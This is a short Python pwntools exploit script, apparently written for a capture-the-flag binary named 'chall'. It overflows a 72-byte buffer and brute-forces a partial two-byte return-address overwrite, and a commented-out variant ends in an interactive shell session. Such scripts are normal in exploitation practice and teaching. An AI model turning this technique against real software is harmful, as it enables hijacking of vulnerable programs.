from pwn import *
import warnings
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
warnings.filterwarnings("ignore")
for i in range(0xf+1):
    try:
        io = start()
        offset = 72
        addr = str(hex(i)) + '1d9'
        print(f"Address: {addr}")
        print(f"Overwrite: {addr}")
        overwrite = int(addr, 16)
        r = b'A'*offset+ p16(overwrite)
        io.sendafter(b'something:', r)
        print(io.recvall())
    except EOFError:
        pass
      
# io = start()
# addr = str(hex(5)) + '1d9'
# overwrite = int(addr, 16)
# r = p16(overwrite)
# payload  = b'A'*72 + r
# io.sendafter(b'something:', payload)
# io.interactive()
